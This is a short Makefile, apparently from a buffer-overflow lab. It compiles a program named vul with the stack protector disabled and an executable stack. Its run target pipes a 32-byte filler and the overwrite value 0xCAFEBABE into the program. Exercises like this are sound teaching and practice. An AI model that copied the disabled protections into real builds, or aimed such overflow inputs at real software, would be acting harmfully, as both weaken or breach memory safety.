build:
	gcc -fno-stack-protector -fomit-frame-pointer -z execstack -o vul vul.c

run:
	python3 -c 'import sys; sys.stdout.buffer.write(32*b"X" + b"\xBE\xBA\xFE\xCA" + b"\n")' | ./vul

clean:
	rm vul
